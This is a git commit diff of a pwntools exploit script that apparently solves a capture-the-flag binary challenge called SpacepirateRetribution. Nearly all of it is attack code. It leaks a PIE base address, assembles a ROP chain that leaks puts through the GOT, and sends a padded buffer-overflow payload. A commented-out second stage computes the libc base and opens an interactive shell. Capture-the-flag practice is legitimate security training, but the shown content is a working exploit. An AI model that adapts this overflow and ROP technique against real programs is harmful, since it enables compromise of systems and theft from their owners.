60cc7b3a563cdaec861a1e934b9dec1b88866211
szhan21 <shunda.zhang@intel.com>
2023-01-07 23:09:05 +0800

    Solving SpacepirateRetribution...

--- ctf/pwn/SpacepirateRetribution/dec.py
+++ ctf/pwn/SpacepirateRetribution/dec.py
@@ -28,24 +28,28 @@ io.sendlineafter('>> ','2')
 rop = ROP(elf)
 
 
-#payload1: leak aslr address of puts
+io.sendlineafter('y = ', '')
+base = io.recvuntil(' (y/n): ').split(b'\n')[-2]
+base = u32(base[1:])<<16
 
-rop.call(elf.plt['puts'], [next(elf.search(b''))])
-rop.call(elf.plt['puts'], [elf.got['puts']])
-rop.call((rop.find_gadget(['ret']))[0])	#!!Padding/16 bytes!
+#print(hex(base))
 
-rop.call(elf.symbols['missile_launcher'])
+pop_rdi_ret = 0x0000000000000d33
 
-payload1 = padding + rop.chain()
+rop_chain = p64(base + pop_rdi_ret)
+rop_chain += p64(base + elf.got['puts'])
+rop_chain += p64(base + elf.plt['puts'])
+rop_chain += p64(base + elf.symbols['missile_launcher'])
+
+payload1 = padding + rop_chain
 log.info(rop.dump())
 
-io.sendlineafter('y = ', '[0x53e5854620fb399f]')
-io.sendlineafter(' (y/n): ', payload1)
+io.sendline(payload1)
 
-#io.recvuntil('\n')
-#io.recvuntil('\n')
-
-puts_addr = u64(io.recvuntil('\n').strip().ljust(8, b'\x00'))
+print(io.recvuntil(b'\x1b[1;34m\n'))
+print(io.recvall())
+'''
+puts_addr = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))
 log.info("Leaked server's libc address, puts(): "+hex(puts_addr))
 
 server_libc_base = puts_addr - libc.symbols['puts']
@@ -63,7 +67,7 @@ log.info(rop_libc.dump())
 io.sendlineafter('y = ', '[0x53e5854620fb399f]')
 io.sendlineafter(' (y/n): ', payload2)
 io.interactive()
-
+'''
 '''
 
 '''
